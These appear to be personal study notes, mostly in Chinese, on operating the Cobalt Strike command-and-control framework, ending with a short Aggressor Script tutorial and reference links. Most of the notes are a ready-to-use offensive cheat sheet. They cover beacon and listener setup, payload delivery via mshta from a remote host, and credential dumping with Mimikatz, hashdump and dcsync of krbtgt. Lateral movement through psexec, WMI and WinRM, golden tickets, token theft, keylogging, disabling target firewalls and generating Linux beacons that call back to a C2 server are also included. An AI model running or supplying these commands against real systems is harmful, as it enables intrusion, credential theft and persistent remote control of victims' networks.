https://mp.weixin.qq.com/s/F1H4ReV71gK7JeoYxV3n5g
https://github.com/k8gege/Aggressor/releases/tag/cs
## 环境介绍
### 启动

```shell
# windows
teamserver.bat 192.168.50.161 123456

# Linux
chomd 777 teamserver
./teamserver 192.168.159.130 pass

-xms 要 <= xmx
# 中文乱码 client
java -Dfile.encoding=utf-8 ...
```

如果报错,设置内存
```bash
java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar
# jdk11 启动
```

### 工具栏

![](https://s2.loli.net/2022/05/18/ot2CiV7mMeKuLq5.jpg)

[hosts / hosts (stager)](https://blog.csdn.net/qq_41874930/article/details/115545366)
可以上线到多个cs 服务器

### 插件安装 

Cobalt strike - 左上角菜单: 脚本管理器 - 选中cna - Load
安装 梼机/OLa

攻击
- Office木马, 生成后监制到docm
- 分阶段木马 - 无法选择中转监听器
- 无阶段木马

Web Drive-by:
- Manage 管理当前Team Server开启的所有web服务
- Clone Site 克隆某网站
- Host File 在Team Server的某端口提供Web以供下载某文件
- Scripted Web Delivery 为payload提供web服务以便于下载和执行
- System Profiler 用来获取系统信息:系统版本, Flash版本,浏览器 版本等

#### Ladon
http://k8gege.org/p/Ladon.html

### Other
meterpreter_reverse_tcp 是不分阶段的payload，要生成 stageless exe.
[stager和stageless区别](https://www.freebuf.com/articles/system/187312.html)

## Attack使用
```shell
sleep 0
shell ipconfig
logonpasswords # 抓取密码 https://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484470&idx=1&sn=b2f7b56028ddf701a903d981e58e324e
psexec # 链接同上
开启中转代理 # 右击主机 - Pivot - socks server(监听在cs server), 速度比较慢但省事, 可用 gost 转成socks 配合 fscan(建议用其他代理出来, 不然太慢)

# 1.exe # 2.hta
mshta http://xx/file.hta
```
### 多种上线方式/内网/代理

0. bind方式上线
1. [SMB bacon](https://cloud.tencent.com/developer/article/2036092) [2](https://forum.butian.net/share/1644) 
2. 中转listenr, 用 tcp Listener, 步骤同1
3. 代理上线 goproxy
4. 正向tcp
5. 中转上线
6. [仅ICMP出网pingtunnel上线msf&cs](https://xz.aliyun.com/t/10626#toc-9)
6. [仅ICMP出网SPP上线Cobalt Strike](https://xz.aliyun.com/t/10626#toc-16)
5. pystinger

[bind_tcp | 内网隧道的多种应用方式 | cobalt strke正向连接多层内网, 反向](https://mp.weixin.qq.com/s/iZxmQJQrLs7XP7XlhGfHmA)
[Pystinger实现内网主机CS上线](https://blog.csdn.net/qq_38963246/article/details/115300897)

0.bind方式上线
```
1) 生成 Stageless payload, 在目标机运行
2) 右击跳板机Session - Interactive
3) bind 目标ip
```
1.SMB bacon
```shell
1.新建 smb listener
2.上线主机右击: portscan,
3.扫出来的主机 右击 - Jump - psexec64 -选一个账号, - listener:smb
```

3.[代理上线](https://blog.csdn.net/st3pby/article/details/127683826)
```shell
#0. 攻击机1.89, 边缘机双ip:1.88/111.131, 内网111.236
#1. 边缘主机131上代理服务 goproxy 
proxy.exe http -t tcp -p "0.0.0.0:8080" --daemon
gost -L=8080 -L=tcp://:822/:8080
#2.然后端口转发到外网ip88上, netsh 总出问题，建议用别的。或者每次删除掉再add
netsh interface portproxy add v4tov4 listenaddress=192.168.111.131 listenport=822 connectaddress=192.168.1.88 connectport=8080
#3.cs端 创建 Listener，配置如下
HTTP HOSTS: 192.168.1.89
HTTP Port: 随便填
HTTP Proxy: http://192.168.111.131:822
# 连接过程  192.168.111.236  → 192.168.111.131:822→ 192.168.1.88:8080→ C2(192.168.1.89)
#4.生成stageless payload
```
重要: __生成stageless payload__


4.正向tcp
```
1.beacon生成一个stageless形式的木马：上传到目标机器运行：
2.在中转机器的Beacon里使用 connect [ip address] [port]

99.销毁Beacon 链接, 在父会话或子会话的控制台中使用 unlink [ip address] [session PID] 。以后，你可以从同一主机（或其他主机）重新连接到 TCP Beacon。
```

5.中转上线

```
右击某 session - Pivoting - Listener 填好内网地址等信息, name:pivot
菜单Attack - Executable(S), 生成stateless 的 exe, listener: pivot
```
#### 上线Linux
CrossC2 - 上线linux插件, 只支持https

```shell
# reverse shell
## 有 profile
gcc test.c -fPIC -shared -o lib_rebind_test.so # test2.c中替换了memcpy防止低系统无法运行
gcc -m32 test.c -fPIC -shared -o lib_rebind_testx86.so
./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 test
./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_testx86.so Linux x86 test
## 无 profile
./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null Linux x64 ./test
./genCrossC2.Linux 192.168.93.1 443 .cobaltstrike.beacon_keys null:config.ini Linux x64 t_cc2.out
# bind shell
./genCrossC2.Linux 192.168.50.161 4431 ./.cobaltstrike.beacon_keys null Linux-bind x64 t3.out
## 1. 上面  ip与port字段无需考虑
## 2. 内网中的目标运行 ./MacOS-bind.beacon <port> 开启服务
## 3. 在网络联通的session中运行 connect <targetIP>:<port>
```

### 代理服务器

Pivoting->SOCKS Server  # 这时监听的ip是cs服务器ip
### 与MSF联动 

[Interoperability with the Metasploit Framework](https://www.cobaltstrike.com/blog/interoperability-with-the-metasploit-framework/)
### 钓鱼攻击/Clone Site

https://blog.csdn.net/B_2013617/article/details/117079467
https://www.youtube.com/watch?time_continue=2&v=fnCLdPOmZOk&feature=emb_logo
[MSF上线CS_adobe flash](https://www.youtube.com/watch?v=fnCLdPOmZOk&t=2s)
erwerwer
## Beacon/Cmd
[Link](https://www.cnblogs.com/icui4cu/p/16056428.html)

Bind TCP Beacon 对应的是 connect 和 unlink.
```shell
# ec2 - smb 是一个Listener
beacon > jump psexec64 FILESERVER ec2 - smb

beacon > link [host] [port]    # beacon_smb/bind_pipe
beacon > connect [host] [port] # Link to a Beacon peer, 对应  beacon_tcp/bind_tcp
beacon > unlink 10.10.10.191 1052 # De-link to a Beacon peer
beacon > rev2self # 恢复原始令牌

beacon > make_token teamssix\administrator Test123!
beacon > jump psexec_psh 192.168.175.200 smb
beacon > logonpasswords
```

* Agent Context
  - cd, pwd, setenv
- File System
  - cp,drives,is,mkdir,mv,rm
  - download,upload
* Process Management
  - kill,ps
* Query the Registry
  - reg query,reg queryv
<br><br>

* Console Tips
  - `Ctrl+D` closes the console (or other active tab)
  - `Ctrl+K` clears the console screen
  - `Ctrl+F` opens a find tool to search the console (works in most other tabs too)
* Beacon Management
  - Use the `clear` command if you mess up

__Execute__
* Run a command,get output
  * `run command`
* Change to another folder
  * `cd c:\folder`
* Print the working directory
  * `pwd`

| CMD   | 回显 | —      | —                            |
| ----- | ---- | ------- | ----------------------------- |
| shell | Y    | cmd.exe | [path:%COMSPEC%] [args:其余]  |
| run   | Y    | cmd.exe | [path:空] [args:全部命令放这] |
| exec  | N    | 同run   |                               |

<br>

* __Use PowerShell through Beacon__
* Import a script:
  * `powershell-import /path/to/local.ps1`
* Use script:
  * `powershell cmdlet args`
* Get help for a script:
  * `powershell Get-Help cmdlet-Full`
  * `powershell 2+2`
<br><br>

* __Use a NET assembly through Beacon__
  * `execute-assembly [/local/file.exe][args]`
  * `execute-assembly taowu-cobalt-strike-master/script/FakeLogonScreen.exe` 太假了
* Run a command via cmd.exe
  * `shell [command][args]`
* Use PowerShell without powershell.exe
  * `powerpick [cmdlet][args]` -- 内存免杀执行powershell命令
* Run PowerShell within another process
  * `psinject [pid][arch][cmdlet][args]`


__Session__ 
右击 - Note , 加备注

__Session Passing__ 

* Spawn and Inject
  - `[beacon]` -> `Spawn` or `spawn [arch][listener]`
* Spawn with alternate parent and Inject
  - `spawnu [pid][listener]`
* Inject into specific process
  - `inject [pid][arch][listener]`


__Session Prepping__ 
* Configure "safe" temporary processes
  - Use `ps` to survey processes on target
  - Use `ppid` to anchor to a specific parent process， 
  - Use `spawnto [arch][path][args]` to change program Cobalt Strike launches for temporary processes, 默认rundll32,可以spawnto 到dllhost [Why is rundll32.exe connecting to the internet? - Cobalt Strike Research and Development](https://www.cobaltstrike.com/blog/why-is-rundll32-exe-connecting-to-the-internet/)
    - `spawnto x86 C:\Windows\syswow64\dllhost.exe`
  - Use `blockdlls start` to enable DLL blocking (blinds userland hooks `[caveats apply]` on Windows 10)
<br>

1. 方式1. 右击 Session - Explore - Process List - 选一个进程 Inject
  - 右击某进程 - 设置为PPID, 使用spawn时, 会以新PPID生成
2. 方式2. `bacon > spawnto x86 c:\program files (x86)\internet explorer\iexplore.exe`

<br>

__File Downloads__
* Download a file
  * `download [file]` , 下载文件在 %cs%\downloads\ 下
* Cancel a download
  * `cancel [file|*]`
* See file downloads in progress
  * `downloads`
* Get to downloaded files
  *  `View->Downloads` , 多选文件后  `Sync Files`

__File Uploads__
* Use upload command to upload a file
  * `upload [/path/to/file]`
* Change file's timestamps
  * `timestomp [destination] [source]`

User Exploitation
* `jobs`
* `jobkill ID`
* Deploy Screenshot Tool
  * `screenshot [pid] [x86|x64] [time]`
* Deploy Keystroke Logger
  * `keylogger` 或 `keylogger [pid] [x86|x64]` 
* Results at:
  * `View -Screenshots` and `View -Keystrokes` 右击 X 可以浮动窗口或分屏
* Watch or control target's desktop
  * sleep 0
  * desktop [pid] [arch] [low|high]
* Use `desktop` by itself to spawn a temporary process and inject into it.

__Elevate Commands__

* `elevate`
* `runasadmin`, 右击session - Access - One-Liner, 选Listener, 生成后复制
  * beacon > runasadmin 粘贴运行, `connect 192.168.239.132 4444`

__Spawn As__
* 用其他用户登录
* `[beacon] -> Access -> Spawn As`

__Credentials and Hashes__
* `logonpasswords` recovers credentials
  * GhostPack [SafetyKatz.exe](https://github.com/GhostPack/SafetyKatz)
  * [Internal Monologue](https://github.com/eladshamir/Internal-Monologue) 不触碰LSASS的情况下抓取 NTLM Hashes 的攻击方式
* `hashdump` recovers local account hashes
  * Use `dcsync` for domain accounts, `dcsync [DOMAIN.fqdn] <DOMAIN\user>`
  * `mimikatz !lasdump::sam` for local
* `View -> Credentials` to manage


### Port Scanning
右击 Session - `Explore - Port Scan` 或
* Beacon has a port scanner for target discovery
  * `portscan <hosts> [ports] [discover] [max]`
* Arguments:
  * `hosts` is a range of targets `192.168.1.0/24,172.16.4.25-172.16.4.100`
  * `ports` is a range of ports to scan `1-1024,5900,8000-9000`
  * `discover` is the method to check if a host is alive.  `arp,icmp`,or `none`.
  * `max` is the maximum number of sockets open at once `4` for Windows XP is OK,`1024` for Windows 7 and later

```sh
beacon > make token CORP\Administrator password1234!  
beacon > jump psexec64 POWERDC local - smb
```
### Pivoting through SOCKS
* Tunnel Traffic
  - Set up a SOCKS4a proxy server tunneling through the current Beacon
  - `socks [port]`
  - Use `socks stop` to kill the SOCKS proxy server.
* `View - Proxy Pivots` to manage pivots.

#### Tunnel Metasploit through Beacon
* Force the Metasploit Framework to use your SOCKS proxy server for connections:
  * `setg Proxies socks4:127.0.0.1:[port]`
  * `setg ReverseAllowProxy true`
* To stop pivoting in this way:
  * `unsetg Proxies`

msf
```sh

msf > use exploit/windows/smb/ms08_067_netapi
msf > set PAYLOAD windows/meterpreter/bind_tcp
msf > set RH0ST 192.168.58.205
msf > setg Proxies socks4:127.0.0.1:1234
msf > run -j

msf > session -i 1
meterpreter > sysinfo

beacon > socks 2000

vi /etc/proxychains.conf
# socks4 127.0.0.1 2000
proxychains rdesktop 10.10.10.5
```

#### Reverse Pivoting
* Tunnel Traffic (Reverse)
  * Make target listen on port and tunnel connection toanother system
  * `rportfwd [listen port][forward host][forward port]`
  * Use `rportfwd stop [listen port] to stop`
* Make sure to account for firewall on target!
### Pivot Listeners
* Create a listener that calls home through a Beacon session...`(Asynchronous C2 is OK!)`
  - `[beacon]` -> `Pivoting` -> `Listener`
* Pivot - POWERDC

![](https://s2.loli.net/2023/01/25/Nic4pXOhvb8yrnU.png)

```sh
POWERDC beacon > shell netstat -nao | findstr "4444"
beacon > shell netsh advfirewall set allprofiles state off
beacon > make_token POWER\Administrator waza1234! 
beacon > ls \\192.168.50.205\C$
beacon > jump psexec ENGINEER pivot - POWERDC
beacon > jump psexec BILLING pivot - POWERDC
```

1. New Listener Name: `local - tcp(pivoting)`
```
Payload: Beacon TCP
Port: 6667
```
2. Windows Executable(Stageless)
```
Listener: local - tcp(pivoting)
Output: Windows Service EXE
x64: √Use x64 Payload
Filename: svcbeacon.exe
```
3. File Browser: 10.10.10.191@816 打开 `\\FILESERVER\C$\windows\temp` 上传 `svcbeacon.exe`
4. `10.10.10.191@816 beacon > remote-exec psexec FILESERVER c:\windows\temp\svcbeacon.exe`
5. `SSH 10.10.10.21 beacon > connect FILESERVER.corp.acme.com 6667`
![](https://s2.loli.net/2023/01/26/WCGNib3OTuZQU6S.png)

查看 Pivot： `Sesssion 右击 - Explore - Browser Pivot`
### Domain
[Link](https://www.youtube.com/watch?v=QF_6zFLmLn0)

```sh
beacon > net domain
beacon > net computers
beacon > powershell-import /root/PowerSpLoit/Recon/Powerview.ps1
beacon > powerpick Get-NetDomain
beacon > powerpick Get-NetDomainController
beacon > powerpick Get-NetComputer
beacon > run wmic computersystem get domain
beacon > run nltest /dclist:corp.acme.com
beacon > run c:\windows\sysnative\nltest.exe /dclist:corp.acme.com
beacon > run net group "Domain Controllers" /DOMAIN
beacon > run net group "Domain Computers"/DOMAIN
beacon > powerpick Find-LocalAdminAccess
beacon > run net group "domain admins" /DOMAIN  # 显示sqladmin 
beacon > net group \\DC.CORP.ACHE.COH Domain Admins # 同上
beacon > net localgroup \\FILESERVER Administrators
# 直接右击Session - File Explorer, 可在地址栏输入 \\FILESERVER
beacon > powerpick Invoke-Command -ComputerName FILESERVER -ScriptBlock {dir c:\ }
beacon > powerpick Invoke-Command -ComputerName FILESERVER -ScriptBlock { systeminfo }
beacon > powershell-import /root/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
beacon > powerpick Invoke-Mimikatz -ComputerName FILESERVER
```

__Steal Token__

1. 没有权限，先看processlist, 然后 steal token, 再ls(有权限了)
2. file explorer: `\\DC\C$` 上传
3. remote-exec wmi DC c:\windows\temp\shell.exe -mon \\.\pipe\monitorsrv
4. link DC xxx
```sh
Process List: 按User排序，偷一个其他用户 点击其他用户进程, 点击: Steal Token
# 或者 beacon > steal_token 8068
beacon > ls \\FILESERVER\C$
beacon > rev2self # revert token
```

__Pass-the-Hash__
```sh
beacon > spawnto x64 c:\windows\system32\dllhost.exe
# Pth 攻击
# 右击 Beacon 窗口 : Access - Make Token 
## 从DC中提取密码哈希, hashdump好像也行
beacon > dcsync CORP.ACME.COM CORP\krbtgt
```

__Kerberos Tickets__
```sh
beacon > whoami /user # sid
beacon > net domain # corp.acme.com
# 右击 Beacon 窗口 : Access - Golden Ticket
beacon > run klist
beacon > run c:\wwindows\sysnative\klist
beacon > ls \\DC.CORP.ACME.COM\C$\
```

```sh
beacon > jump
beacon > jump psexec64 DC local - smb
# jump - winrm64
```

upload file
```sh
cd \\host\C$\windows\temp
upload /path/to/file.exe
```

__Run an Artifact__
* List remote execute methods:
  - `remote-exec`
* Run a command on remote target
  - `emote-exec [method][target][command]`


| Module | Description                                      |
| ------ | ------------------------------------------------ |
| psexec | Run command via a new service                    |
| winrm  | Run PowerShell expression via WinRM (PowerShell) |
| wir    | Run command via WinRM (PowerShell)               |

beacon > 
### SSH Sessions
* Launch SSH session with credentials: 
  - `ssh [target:port] [username] [password]`
* Launch SSH session with key authentication: 
  - `ssh-key [target:port] [username] [/path/key]`
- Run a command
  - `shell [command] [args]`
- Run a command with sudo
  - `sudo [password] [command] [args]`
  - `sudo password1234 cat /etc/shadow`
- Change folder
  - `cd /path/`
- Download and Upload files
  - `upload [/local/file]`
  - `download [file]`
* Start SOCKS pivoting
  - `socks 1234`
* Reverse Port forward
  - `rportfwd [listen port] [forward host] [forward port]`

`rportfwd` does require that the SSH daemon's `GatewayPorts` option is set to `yes` or `ClientSpecified`.
## Plugins

### CrossC2/上线Linux
有问题时看 CS: View - Weblog

__使用profile__

protocol_demo有 `c2profile.c https.profile`

1. 使用 https.profile 启动 teamserver
1. 新建 `HTTPS` Listener, 只支持HTTPS
1. 编译 c2profile.c
1. 生成 bin 运行

```shell
teamserver.bat 192.168.50.161 xxxxxxx https.profile
gcc c2profile.c -fPIC -shared -o lib_rebind_test.so
./genCrossC2.Linux 192.168.50.161 4431 .cobaltstrike.beacon_keys lib_rebind_test.so Linux x64 test
./test
```

修改心跳 CrossC2Kit_Loader.cna 末尾添加
```shell
# sleep 60
on ssh_initial {
    # show_message("1有新的LIUNX主机上线\nIP为".beacon_info($1,"internal")."\n主机名字为：".beacon_info($1,"computer"));
    bsleep($1, 60);
}
```

# Learning

## Step1 

EventLog里可以聊天 交流。
/msg `butane text -- 私聊信息

Cobalt Strike Artifact Survey

| Artifact           | Migrates | RWX  | Module-less Thread |
| ------------------ | -------- | ---- | ------------------ |
| Executable         | no       | no   | no                 |
| DLL                | no       | no   | no                 |
| DLL(x64->x86)      | yes      | no   | yes                |
| Java Applet (x86)  | yes      | no   | no                 |
| Java Applet (x64)  | yes      | no   | yes                |
| PowerShell         | no       | yes  | no                 |
| Python             | no       | yes  | yes                |
| Service Executable | yes      | no   | no                 |
| VBA Macro          | yes      | yes  | yes                |

## plugin/CS插件
View - Script Console 

Aggressor Script: 是C2 3.0以上版本的一个内置的脚本语言,由Sleep脚本解析; 在CS 3.0以上的版本,菜单､选项､事件､都有默认的default.cna构建.
Sleep语言下载地址: http://sleep.dashnine.org/download/sleep.jar
- 快速使用: `java -jar sleep.jar` , 新建1.cna, 内容为 `println("hello, world")`, 进入后 `load 1.cna`
- 输出 hello word: Script Console 中 `e println("hello, world")`

help 查看一些帮助信息｡
- ? 进行一个简单的判断 ,返回值为True或者False,例如 `? int(1) == int(2)` 返回为False 
- e 执行我们写的代码,相当于交互模式,如果不加上 e 的话是无法执行的,例如 `e printn("Hello World")`
- 创建一个 command 名字为 w,当输入w的时候就打印hello word, 可以 `e command w{ println("hello, world"); }`

```
# 1.cna

command w{
    println("hello, world");
}
```

aggressor>w

彩色输出
```
println("\c0This is my color");
println("\c1This is my color"); # 这是黑色
println("\c2This is my color");
println("\c3This is my color");
println("\c4This is my color");
println("\c5This is my color");
println("\c6This is my color");
println("\c7This is my color");
println("\c8This is my color");
println("\c9This is my color");
println("\cAThis is my color");
println("\cBThis is my color");
println("\cCThis is my color");
println("\cDThis is my color");
println("\cEThis is my color");
println("\cFThis is my color");
```

键盘快捷键
```
bind Ctrl+H {
    show_message("Pressed Ctrl+H");  # 弹窗显示消息
    elog("使用了快捷键!");            # 在 Event Log位置显示信息
}
```

菜单编写
我们可以自己定义想要的菜单或者将我们的二级菜单添加到已经存在的主菜单下,创建自定义菜单语法如下:
```
popup <菜单函数名>{
    item(＂&<二级菜单显示>＂,{点击时执行的代码,或者函数}); #第一个子菜单
    separator();#分割线
    item(＂&<二级菜单名字>＂,(点击时执行的代码,或者函数}); #第二个子菜单
    separator(); #分割线
}
menubar("一级菜单显示名", "菜单函数名");
```

一个简单的菜单:
```
popup my_help{
    item("&这是百度",{url_open("http://www.baidu.com")});
    separator();
    item("&这是谷歌",{url_open("http://www.Google.com")}); # url_open()这个数是用来打开网站的
}
menubar ("帮助菜单", "my_help"); # 菜单函数,一定要加上
```
如果我们并不想创建新的菜单,而是想在默认的菜单上增加,我们可以这样做:

```
popup help { # 在help菜单中添加
    separator();
    item("&关于汉化",{show_message("4.1汉化 by XXX")});
}
```

__输入框的编写__

dialog 编写,接受三个参数

- `$1` 对话框的名称
- `$2` 对话框里面的内容,可以写多个
- `$3` 回调函数,当用户使用dbutton_action调用的函数
```
popup test{
    item("&收集信息",{dialog_test()}); # 建立一个菜单栏目,点击收集信息时就调用show函数
}
menubar("测试菜单","test"); # 注册菜单

sub show {
    println("hello, world");
    show_message("dialog的引用是:".$1."\n按钮名称是:".$2);
    println("用户名是:".$3["user"]."\n密码是:".$3["password"]); # 这里show函数接收到了dialog传递过来的参数
}

sub dialog_test {
    $info = dialog("这是对话框的标题",%(username => "root",password => ""),&show); # 第一个是菜单的名字,第二个是我们下面定义的菜单显示内容的默认值,第三个参数是我们回调函数,触发show函数的时候显示
    drow_text($info,"user","输入用户名:")
    drow_text($info,"password","输入密码");
    dbutton_action($info,"马上起飞!");
    dbutton_help($info,"http://www.baidu.com"); # 显示帮助信息
    dialog_show($info); # 显示文本输入框
}
```

# Sliver
[安全工具开发-跨平台植入型框架Sliver生成C2](https://www.bilibili.com/video/BV1xL411Q7hH/)

# Article
[全网最全的Cobalt Strike使用教程系列-基础篇](https://mp.weixin.qq.com/s/4KvmV9cdyzPsYHtBlEKGFQ)
[干货|两个超实用的上线Cobaltstrike技巧！](https://mp.weixin.qq.com/s/jGwrVr0iotelS4KivC8pwA)
[全网最全的 Cobalt Strike 使用教程-内网渗透之域控攻击篇](https://mp.weixin.qq.com/s/Nfhwx0JRt5S5LbcsXNMeyg)
[Cobalt Strike Training Resources](https://www.cobaltstrike.com/training/)
[done 4/9 | Cobalt Strike Red Team Ops - Training Cours](https://www.youtube.com/playlist?list=PLcjpg2ik7YT6H5l9Jx-1ooRYpfvznAInJ)
[干货分享 | 魔改cs4.5--消除流量特征](https://mp.weixin.qq.com/s/g6sWwKkCMESAibj3CU87lQ)
[基于Caddy实现的C2前置代理 - RedCaddy](https://mp.weixin.qq.com/s/usHrpgxCvGsu9vvf0SMSBQ)

## 使用帮助
[提取密码 | 对湾湾某网站的一次渗透测试](http://mp.weixin.qq.com/s?__biz=MzIwMDcyNzM0Mw==&mid=2247484330&idx=1&sn=fa5f3c3de8737f3ddbc5622917b2c852)

## plugin
[分享个CobaltStrike插件 Bypass防护添加用户（附下载）](https://mp.weixin.qq.com/s/6nu1dwdvdtnP_6C-nIpMVg)
[Cobalt-Strike之CrossC2插件安装与linux上线](https://mp.weixin.qq.com/s/Fty2S9ettdtTFgJWVTvQNQ)
[CobaltStrike加载插件](https://mp.weixin.qq.com/s/NtxhTkuMGhhRyLUREnZQcA)

## Vocabulary

C2：Cobalt Strike
